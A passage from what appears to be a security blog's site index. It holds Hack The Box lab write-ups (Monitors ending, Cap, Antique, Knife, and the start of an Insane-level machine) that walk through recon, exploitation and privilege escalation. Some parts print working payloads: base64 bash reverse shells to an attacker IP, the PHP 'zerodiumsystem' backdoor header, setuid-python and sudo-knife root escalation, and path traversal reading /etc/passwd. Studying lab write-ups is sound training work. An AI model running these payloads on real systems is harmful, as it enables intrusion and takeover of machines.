until the correct one is found:\nwww-data@monitors:/home/marcus$ cat .backup/backup.sh #!/bin/bash  backup_name=\u0026#34;cacti_backup\u0026#34; config_pass=\u0026#34;VerticalEdge2020\u0026#34;  zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/* sshpass -p \u0026#34;${config_pass}\u0026#34; scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip rm /tmp/${backup_name}.zip So we can login as marcus with password VerticalEdge2020 and get a hint to know that the Docker container might be vulnerable (note.txt). Moreover, now we could use SSH port forwarding instead of chisel.\nwww-data@monitors:/home/marcus$ su marcus Password: marcus@monitors:~$ cat note.txt TODO: Disable phpinfo in php.ini - DONE Update docker image for production use - marcus@monitors:~$ cat user.txt efecb015501176da1d8423d3843cfd6b ","image":"/images/HTB/Monitors/Monitors.png","permalink":"https://7rocky.github.io/en/htb/monitors/","section":"htb","summary":"Hack The Box. Linux. Hard machine. This machine has a Wordpress web site with a plugin vulnerable to Directory Path Traversal, another website vulnerable to SQL injection, and yet another webpage vulnerable to Insecure Deserialization running inside a Docker container with system capabilities enabled. Deep knowledge about web enumeration, vulnerabilities and exploitation techniques, as well as port forwarding and Docker escaping methods are needed to compromise this machine. This write-up uses a custom Bash script to exploit Insecure Deserialization","time":12,"title":"Monitors"},{"contents":"  OS: Linux   Difficulty: Easy   IP Address: 10.10.10.245   Release: 05 / 06 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.10.245 -p 21,22,80 Nmap scan report for 10.10.10.245 Host is up (0.052s latency).  PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA) | 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA) |_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519) 80/tcp open http gunicorn ... Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 132.74 seconds This machine has ports 21 (FTP), 22 (SSH) and 80 (HTTP) open.\nWeb enumeration The hosted website is the following:\nClicking on \u0026ldquo;Security Snapshot\u0026rdquo;, will perform a network analysis an allow to download a .pcap file:\nTaking a look at the URL, the snapshot is number 2. If we try to load number 0, we will obtain a snapshot with more data (Insecure Direct Object Reference, IDOR):\nFrom Wireshark to FTP From the website on port 80, we can download a file called 0.pcap. Using Wireshark and filtering by FTP, these credentials can be found: nathan:Buck3tH4TF0RM3!:\nNow, it is possible to connect to an FTP session:\n$ ftp nathan@10.10.10.245 Connected to 10.10.10.245. 220 (vsFTPd 3.0.3) 331 Please specify the password. Password: 230 Login successful. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -r-------- 1 1001 1001 33 Jun 03 12:32 user.txt 226 Directory send OK. ftp\u0026gt; get user.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for user.txt (33 bytes). WARNING! 1 bare linefeeds received in ASCII mode File may not have transferred correctly. 226 Transfer complete. 33 bytes received in 0,00163 seconds (19,8 kbytes/s)  The user flag is now readable locally:\n$ cat user.txt 75a722ca7210ed19207176d03c571c52  Privilege escalation Moreover, the same credentials can be used to login via SSH:\n$ ssh nathan@10.10.10.245 nathan@10.10.10.245's password: nathan@cap:~$  Executing linpeas.sh it can be found that /usr/bin/python3.8 has the capability cap_setuid enabled. We can check it manually:\nnathan@cap:~$ getcap -r / 2\u0026gt;/dev/null /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip /usr/bin/ping = cap_net_raw+ep /usr/bin/traceroute6.iputils = cap_net_raw+ep /usr/bin/mtr-packet = cap_net_raw+ep /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep  So, with Python, the privilege escalation is easily done (more information in GTFOBins or with my tool gtfobins-cli):\n$ gtfobins-cli --capabilities python python ==\u0026gt; https://gtfobins.github.io/gtfobins/python/ Capabilities If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID. cp $(which python) . sudo setcap cap_setuid+ep python ./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'  nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' root@cap:~# cat /root/root.txt 634be64976a543a6490b0656f928c293  ","image":"/images/HTB/Cap/Cap.png","permalink":"https://7rocky.github.io/en/htb/cap/","section":"htb","summary":"Hack The Box. Linux. Easy machine. This machine contains Insecure Direct Object Reference (IDOR) and system capabilities. Reading capture files in Wireshark and capabilities enumeration skills are needed to compromise this machine","time":3,"title":"Cap"},{"contents":"  OS: Linux   Difficulty: Easy   IP Address: 10.10.11.107   Release: 27 / 09 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.107 -p 23 Nmap scan report for 10.10.11.107 Host is up (0.041s latency). PORT STATE SERVICE VERSION 23/tcp open telnet? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: | JetDirect | Password: | NULL: |_ JetDirect ... Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 166.81 seconds  This machine has port 23 (Telnet) open.\nEnumeration First, we can connect to the machine using Telnet, and we are asked for a password:\n$ telnet 10.10.11.107 23 Trying 10.10.11.107 Connected to 10.10.11.107. Escape character is '^]'. HP JetDirect password:  We can try some default credentials for JetDirect printer but none of them work.\nSNMP enumeration There is an exploit which shows that JetDirect printers exposes the password through SNMP:\n$ searchsploit JetDirect ------------------------------------------------------------------------------- --------------------------- Exploit Title | Path ------------------------------------------------------------------------------- --------------------------- HP Jetdirect - Path Traversal Arbitrary Code Execution (Metasploit) | unix/remote/45273.rb HP JetDirect FTP Print Server - 'RERT' Denial of Service | windows/dos/29787.py HP JetDirect J3111A - Invalid FTP Command Denial of Service | hardware/dos/20090.txt HP JetDirect PJL - Interface Universal Directory Traversal (Metasploit) | hardware/remote/17635.rb HP JetDirect PJL - Query Execution (Metasploit) | hardware/remote/17636.rb HP JetDirect Printer - SNMP JetAdmin Device Password Disclosure | hardware/remote/22319.txt HP JetDirect rev. G.08.x/rev. H.08.x/x.08.x/J3111A - LCD Display Modification | hardware/remote/20565.c ------------------------------------------------------------------------------- --------------------------- Shellcodes: No Results $ searchsploit -x 22319 HP JetDirect J2552A/J2552B/J2591A/J3110A/J3111A/J3113A/J3263A/300.0 X Printer SNMP JetAdmin Device Password Disclosure Vulnerability source: https://www.securityfocus.com/bid/7001/info A problem with JetDirect printers could make it possible for a remote user to gain administrative access to the printer. It has been reported that HP JetDirect printers leak the web JetAdmin device password under some circumstances. By sending an SNMP GET request to a vulnerable printer, the printer will return the hex-encoded device password to the requester. This could allow a remote user to access and change configuration of the printer. C:\\\u0026gt;snmputil get example.printer public .1.3.6.1.4.1.11.2.3.9.1.1.13.0  We see if port 161 (SNMP) is open using an UDP scan with nmap:\n# nmap -sU 10.10.11.107 -p 161 Starting Nmap 7.92 ( https://nmap.org ) Nmap scan report for 10.10.11.107 Host is up (0.048s latency). PORT STATE SERVICE 161/udp open snmp Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds  Now, we can use snmpwalk in a similar way as the exploit says:\n$ snmpwalk -v2c -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0 iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135  Foothold The previous information obtained with snmpwalk are hexadecimal numbers that represent characters. We can build a simple Python script called decode.py to decode them (detailed explanation here).\nFinding a password If we try with the whole list of digits, we will get decoding errors:\n$ python3 decode.py 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 binascii.Error Odd-length string  We can remove digits from the end until everything decodes well:\n$ python3 decode.py 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 P@ssw0rd@123!!123  Now that we have the printer password, we can connect using Telnet:\n$ telnet 10.10.11.107 23 Trying 10.10.11.107 Connected to 10.10.11.107. Escape character is '^]'. HP JetDirect password: P@ssw0rd@123!!123 Please type \"?\" for HELP \u0026gt; ? To Change/Configure Parameters Enter: Parameter-name: value \u0026lt;Carriage Return\u0026gt; Parameter-name Type of value ip: IP-address in dotted notation subnet-mask: address in dotted notation (enter 0 for default) default-gw: address in dotted notation (enter 0 for default) syslog-svr: address in dotted notation (enter 0 for default) idle-timeout: seconds in integers set-cmnty-name: alpha-numeric string (32 chars max) host-name: alpha-numeric string (upper case only, 32 chars max) dhcp-config: 0 to disable, 1 to enable allow: \u0026lt;ip\u0026gt; [mask] (0 to clear, list to display, 10 max) addrawport: \u0026lt;TCP port num\u0026gt; (\u0026lt;TCP port num\u0026gt; 3000-9000) deleterawport: \u0026lt;TCP port num\u0026gt; listrawport: (No parameter required) exec: execute system commands (exec id) exit: quit from telnet session  We see that there is a command called exec that allow to execute system commands:\n\u0026gt; exec id uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)  So now we can connect to the machine using a reverse shell:\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx  \u0026gt; exec echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.107. Ncat: Connection from 10.10.11.107:54808. bash: cannot set terminal process group (812): Inappropriate ioctl for device bash: no job control in this shell lp@antique:~$ script /dev/null -c bash Script started, file is /dev/null lp@antique:~$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm lp@antique:~$ export TERM=xterm lp@antique:~$ export SHELL=bash lp@antique:~$ stty rows 50 columns 158  System enumeration As user lp we are able to read the user.txt flag:\nlp@antique:~$ cat user.txt ea8fbeada4a37b5e23f862098f36d72b  Listing internal open ports, we see that port 631 (IPP) is open:\nlp@antique:~$ netstat -nat | grep LISTEN Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 127.0.0.1:631 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:23 0.0.0.0:* LISTEN tcp6 0 0 ::1:631 :::* LISTEN  To explore this port, we can make port forwarding using chisel:\n$ ./chisel server -p 1337 --reverse server: Reverse tunnelling enabled server: Fingerprint lEVau5AqQ5yJn+cIJcdKHCOmSYVFY67kTuCt1JtmjtY= server: Listening on http://0.0.0.0:1337 server: session#1: tun: proxy#R:631=631: Listening  lp@antique:~$ cd /tmp lp@antique:/tmp$ curl 10.10.17.44/chisel -so chisel lp@antique:/tmp$ chmod +x chisel lp@antique:/tmp$ ./chisel client 10.10.17.44:1337 R:631:127.0.0.1:631 client: Connecting to ws://10.10.17.44:1337 client: Connected (Latency 109.928393ms)  Now we can access port 631 from our machine. In the browser, we see that it is running CUPS 1.6.1:\nPrivilege escalation CUPS 1.6.1 has a file read vulnerability (with root permissions), found here. We only need to change CUPS configuration so that the error log path points to any file we desire to read (/root/root.txt, /etc/shawow or whatever).\nWe are not allowed to change the configuration from the browser because creentials are needed and they are different from the ones used before:\nHowever, we can use cupsctl from the machine, because user lp belongs to group lpadmin:\nlp@antique:/tmp$ cupsctl ErrorLog=\"/root/root.txt\"  Reading files as root And now, we can read the root.txt flag (from the browser or using curl):\nlp@antique:/tmp$ curl -s http://localhost:631/admin/log/error_log fc93061adb9c109d8984391d4cdadeed  This time, there is no way to have a root shell, because there is no SSH service running (so no SSH private key for root). The only thing we could do is to crack the root hash from /etc/shadow using rockyou.txt, but with no success.\n","image":"/images/HTB/Antique/Antique.png","permalink":"https://7rocky.github.io/en/htb/antique/","section":"htb","summary":"Hack The Box. Linux. Easy machine. This machine is a HP JetDirect printer that exposes its password through SNMP and has an arbritrary file read vulnerability. SNMP enumeration and port forwarding techniques are needed to compromise this machine. This write-up uses a custom Python script to obtain a clear-text password","time":6,"title":"Antique"},{"contents":"  OS: Linux   Difficulty: Easy   IP Address: 10.10.10.242   Release: 22 / 05 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.10.242 -p 22,80 Nmap scan report for 10.10.10.242 Host is up (0.053s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA) | 256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA) |_ 256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Emergent Medical Idea Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 10.72 seconds  This machine has ports 22 (SSH) and 80 (HTTP) open.\nEnumeration If we go to http://10.10.10.242 we will see this website:\nLooking at the HTTP headers of the response, we find that it is using PHP/8.1.0-dev:\n$ curl 10.10.10.242 -I HTTP/1.1 200 OK Date: Server: Apache/2.4.41 (Ubuntu) X-Powered-By: PHP/8.1.0-dev Content-Type: text/html; charset=UTF-8  The issue is that this development version was released with a backdoor. Putting a header: User-Agentt: zerodiumsystem(\u0026quot;whoami\u0026quot;); in the request executes the command whoami (more information here).\nFoothold Let\u0026rsquo;s use a reverse shell:\n$ echo -n 'bash -i \u0026gt;\u0026 /dev/tcp/10.10.17.44/4444 0\u0026gt;\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx $ curl 10.10.10.242 -H 'User-Agentt: zerodiumsystem(\"echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash\");'  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.242. Ncat: Connection from 10.10.10.242:54378. bash: cannot set terminal process group (950): Inappropriate ioctl for device bash: no job control in this shell james@knife:/$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null james@knife:/$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm james@knife:/$ export TERM=xterm james@knife:/$ export SHELL=bash james@knife:/$ stty rows 50 columns 158  System enumeration We enter the machine as james:\njames@knife:/$ cd james@knife:~$ cat user.txt 3c9359d46d35b73071095b9ef4e0dcf0  This user can execute knife as root without password:\njames@knife:~$ sudo -l Matching Defaults entries for james on knife: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User james may run the following commands on knife: (root) NOPASSWD: /usr/bin/knife  Privilege escalation Reading the help panel of knife it can be found a way to execute Ruby scripts using knife exec. So, /bin/bash can be executed as root from a Ruby script. We can also check GTFOBins or use my tool gtfobins-cli:\n$ gtfobins-cli --sudo knife knife ==\u0026gt; https://gtfobins.github.io/gtfobins/knife/ Sudo If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access. sudo knife exec -E 'exec \"/bin/sh\"'  james@knife:~$ sudo knife exec -E 'exec \"/bin/bash\"' root@knife:/home/james# cd root@knife:~# cat root.txt b631aac1a84b2e5cf9063d641735eb59  ","image":"/images/HTB/Knife/Knife.png","permalink":"https://7rocky.github.io/en/htb/knife/","section":"htb","summary":"Hack The Box. Linux. Easy machine. This machine contains a webpage built on PHP with a version that has a backdoor and sudo permissions configured. Knowledge of the PHP version and basic privilege escalation skills are needed to compromise this machine","time":3,"title":"Knife"},{"contents":"  OS: Linux   Difficulty: Insane   IP Address: 10.10.10.148   Release: 03 / 08 / 2019   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.10.148 -p 22,9999 Nmap scan report for 10.10.10.148 Host is up (0.058s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 56:84:89:b6:8f:0a:73:71:7f:b3:dc:31:45:59:0e:2e (RSA) | 256 76:43:79:bc:d7:cd:c7:c7:03:94:09:ab:1f:b7:b8:2e (ECDSA) |_ 256 b3:7d:1c:27:3a:c1:78:9d:aa:11:f7:c6:50:57:25:5e (ED25519) 9999/tcp open abyss? | fingerprint-strings: | GetRequest, HTTPOptions: | HTTP/1.1 200 OK | Accept-Ranges: bytes | Cache-Control: no-cache | Content-length: 4871 | Content-type: text/html | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\"en\"\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;title\u0026gt;Login V10\u0026lt;/title\u0026gt; | \u0026lt;meta charset=\"UTF-8\"\u0026gt; | \u0026lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"\u0026gt; | \u0026lt;!--===============================================================================================--\u0026gt; | \u0026lt;link rel=\"icon\" type=\"image/png\" href=\"images/icons/favicon.ico\"/\u0026gt; | \u0026lt;!--===============================================================================================--\u0026gt; | \u0026lt;link rel=\"stylesheet\" type=\"text/css\" href=\"vendor/bootstrap/css/bootstrap.min.css\"\u0026gt; | \u0026lt;!--===============================================================================================--\u0026gt; | \u0026lt;link rel=\"stylesheet\" type=\"text/css\" href=\"fonts/font-awesome-4.7.0/css/font-awesome.min.css\"\u0026gt; |_ \u0026lt;!--=============================================== Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 146.57 seconds  This machine has ports 22 (SSH) and 9999 (HTTP) open.\nEnumeration If we go to http://10.10.10.148:9999, we will see a login form:\nIf we try any credentials, we will see \u0026ldquo;File not found\u0026rdquo;:\nLet\u0026rsquo;s fuzz to get more routes:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.148:9999/FUZZ images [Status: 200, Size: 225, Words: 9, Lines: 3, Duration: 52ms] css [Status: 200, Size: 317, Words: 11, Lines: 4, Duration: 298ms] js [Status: 200, Size: 226, Words: 9, Lines: 3, Duration: 37ms] vendor [Status: 200, Size: 1011, Words: 25, Lines: 11, Duration: 4466ms] fonts [Status: 200, Size: 643, Words: 17, Lines: 7, Duration: 64ms]  If we go to any of the above endpoints, we will see a directory listing:\nLet\u0026rsquo;s try fuzzing with another wordlist to test for Directory Path Traversal vulnerabilities:\n$ ffuf -w $WORDLISTS/wfuzz/Injections/Traversal.txt -u http://10.10.10.148:9999/FUZZ ../../../../../../../../../../../../etc/hosts [Status: 200, Size: 273, Words: 21, Lines: 10, Duration: 538ms] ../../../../../../../../../../../../etc/hosts%00 [Status: 200, Size: 273, Words: 21, Lines: 10, Duration: 539ms] ../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 1594, Words: 9, Lines: 32, Duration: 539ms] /../../../../../../../../../../../etc/passwd%00.jpg [Status: 200, Size: 1594, Words: 9, Lines: 32, Duration: 540ms] ../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1594, Words: 9, Lines: 32, Duration: 540ms] /./././././././././././etc/passwd [Status: 200, Size: 1594, Words: 9, Lines: 32, Duration: 562ms] /../../../../../../../../../../etc/passwd [Status: 200, Size: 1594, Words: 9, Lines: 32, Duration: 577ms] /../../../../../../../../../../../etc/passwd%00.html [Status: 200, Size: 1594, Words: 9, Lines: 32, Duration: 577ms] /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 1594, Words: 9, Lines: 32, Duration: 79ms]  Cool, that was unexpected.\nFoothold Let\u0026rsquo;s read /etc/passwd (actually, we only need to append the path to the root URL):\n$ curl 10.10.10.148:9999//etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin r4j:x:1000:1000:r4j:/home/r4j:/bin/bash john:x:1001:1001:,,,:/home/john:/bin/bash $ curl 10.10.10.148:9999//etc/passwd -s | grep sh$ root:x:0:0:root:/root:/bin/bash r4j:x:1000:1000:r4j:/home/r4j:/bin/bash john:x:1001:1001:,,,:/home/john:/bin/bash  Nice, there are three available users on the machine: root, r4j and john.\nDirectory Path Traversal exploitation At this point, let\u0026rsquo;s enumerate what technology is behind the web server. We can leak this information going to /proc/self/cmdline:\n$ curl 10.10.10.148:9999//proc/self/cmdline -vso - * Trying 10.10.10.148:9999... * Connected to 10.10.10.148 (10.10.10.148) port 9999 (#0) \u0026gt; GET //proc/self/cmdline HTTP/1.1 \u0026gt; Host: 10.10.10.148:9999 \u0026gt; User-Agent: curl/7.84.0 \u0026gt; Accept: */* \u0026gt; * Mark bundle as not supporting multiuse \u0026lt; HTTP/1.1 200 OK \u0026lt; Accept-Ranges: bytes \u0026lt; Cache-Control: no-cache \u0026lt; Content-length: 0 \u0026lt; Content-type: text/plain \u0026lt; * Connection #0 to host 10.10.10.148 left intact $ nc 10.10.10.148 9999 \u0026lt;\u0026lt;\u0026lt; $'GET //proc/self/cmdline HTTP/1.1\\n\\n' HTTP/1.1 200 OK Accept-Ranges: bytes Cache-Control: no-cache Content-length: 0 Content-type: text/plain  But we get nothing\u0026hellip; Let\u0026rsquo;s list the /proc/self directory:\nIt seems that all files are empty, except for /proc/self/exe, which is a symbolic link to the binary that is being executed.\nWe can download it and analyze it. In fact, it is a 32-bit ELF:\n$ curl 10.10.10.148:9999//proc/self/exe -so exe $ file exe content/exe: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e4e105bd11d096b41b365fa5c0429788f2dd73c3, not stripped  Actually, we can access /proc/self/cwd and see all the files at the current working directory of the binary:\nThe binary is called httpserver, and uses run.sh to run (obviously):\n$ curl 10.10.10.148:9999//proc/self/cwd/run.sh  #!/bin/bash source/home/john/.bashrc whiletrue; docd/opt/www; ./httpserver; done  Binary analysis: httpserver To analyze the binary, we can use Ghidra and view the decompiled C source code. This is the main function:\nvoidmain(intparam_1, intparam_2) { intiVar1; intiVar2; intin_GS_OFFSET; socklen_tlocal_140; intlocal_13c; char*local_138; intlocal_134; intlocal_130; intlocal_12c; intlocal_128; sockaddr local_124; charlocal_114[256]; undefined4 local_14; undefined4 *puStack16;  iVar1 =param_2; iVar2 =param_1; puStack16 =\u0026amp;param_1; local_14 =*(undefined4 *) (in_GS_OFFSET +0x14); local_13c =9999; local_138 =getcwd(local_114, 0x100); local_140 =0x10; if(iVar2 ==2) { if((**(char**) (iVar1 +4) \u0026lt;'0') ||('9'\u0026lt;**(char**) (iVar1 +4))) { local_138 =*(char**) (iVar1 +4); iVar2 =chdir(*(char**) (iVar1 +4)); if(iVar2 !=0) { perror(*(char**) (iVar1 +4)); /* WARNING: Subroutine does not return */ exit(1); } } else{ local_13c =atoi(*(char**) (iVar1 +4)); } } elseif(iVar2 ==3) { local_13c =atoi(*(char**) (iVar1 +8)); local_138 =*(char**) (iVar1 +4); iVar2 =chdir(*(char**) (iVar1 +4)); if(iVar2 !=0) { perror(*(char**) (iVar1 +4)); /* WARNING: Subroutine does not return */ exit(1); } } local_134 =open_listenfd(local_13c); local_130 =local_134; if(0\u0026lt;local_134) { printf(\"listen on port %d, fd is %d\\n\", local_13c, local_134); signal(0xd, (__sighandler_t) 0x1); signal(0x11, (__sighandler_t) 0x1); while(true) { do{ local_12c =accept(local_134, \u0026amp;local_124, \u0026amp;local_140); } while(local_12c \u0026lt;0); local_128 =process(local_12c, \u0026amp;local_124); if(local_128 ==1) break; close(local_12c); } /* WARNING: Subroutine does not return */ exit(0); } perror(\"ERROR\"); /* WARNING: Subroutine does not return */ exit(local_134); }  Basically, it starts a socket server on port 9999 and waits for connections. Once a connection arrives, it is passed to the process function:\nundefined4 process(intparam_1, undefined4 param_2) { __pid_t_Var1; undefined4 uVar2; int__fd; intin_GS_OFFSET; undefined4 local_884; stat local_870; charlocal_818[2048]; intlocal_18; intlocal_14; intlocal_10; local_10 =*(int*) (in_GS_OFFSET +0x14); _Var1 =fork(); if(_Var1 ==0) { if(param_1 \u0026lt;0) { uVar2 =1; } else{ _Var1 =getpid(); printf(\"accept request, fd is %d, pid is %d\\n\", param_1, _Var1); parse_request(param_1, local_818); local_884 =200; __fd =open(local_818, 0, 0); if(__fd \u0026lt;1) { local_884 =0x194; client_error(param_1, 0x194, \"Not found\", \"File not found\"); } else{ fstat(__fd, \u0026amp;local_870); if((local_870.st_mode \u0026amp;0xf000) ==0x8000) { if(local_14 ==0) { local_14 =local_870.st_size; } if(0\u0026lt;local_18) { local_884 =0xce; } serve_static(param_1, __fd, local_818, local_870.st_size); } elseif((local_870.st_mode \u0026amp;0xf000) ==0x4000) { local_884 =200; handle_directory_request(param_1, __fd, local_818); } else{ local_884 =400; client_error(param_1, 400, \"Error\", \"Unknow Error\"); } close(__fd); } log_access(local_884, param_2, local_818); uVar2 =1; } } else{ uVar2 =0; } if(local_10 !=*(int*) (in_GS_OFFSET +0x14)) { uVar2 =__stack_chk_fail_local(); } returnuVar2; }  Here we can see some interesting functions: parse_request, client_error, serve_static, handle_directory_request and log_access. Let\u0026rsquo;s take a look at the last one:\nvoidlog_access(undefined4 param_1, intparam_2, char*param_3) { intiVar1; uint16_tuVar2; char*pcVar3; intin_GS_OFFSET;  iVar1 =*(int*) (in_GS_OFFSET +0x14); uVar2 =ntohs(*(uint16_t*) (param_2 +2)); pcVar3 =inet_ntoa((in_addr) ((in_addr *) (param_2 +4))-\u0026gt;s_addr); printf(\"%s:%d%d- \", pcVar3, (uint) uVar2,param_1); printf(param_3); puts(\"\"); puts(\"request method:\"); puts(param_3 +0x400); if(iVar1 !=*(int*) (in_GS_OFFSET +0x14)) { __stack_chk_fail_local(); } return; }  Can you see it? I mean, the vulnerability. The above function has a Format String vulnerability, since param_3 is passed to printf as the first argument. This param_3 is local_818 in process, which contains the actual URI requested to the server. Hence, we can take control over this variable and exploit the vulnerability.\nExploit preparation To do so, let\u0026rsquo;s run the httpserver locally. I would also like to download the remote 